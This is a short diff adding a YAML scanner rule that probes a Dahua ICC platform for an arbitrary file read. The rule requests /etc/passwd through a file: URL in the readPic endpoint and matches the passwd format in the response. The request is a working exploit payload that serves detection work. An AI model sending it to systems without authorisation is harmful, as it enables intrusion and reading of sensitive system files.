@@ -1,0 +1,8 @@
+name: dahua-icc-readpic-fileread
+rules:
+  - method: GET
+    path: "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+detail:
+  author: 666
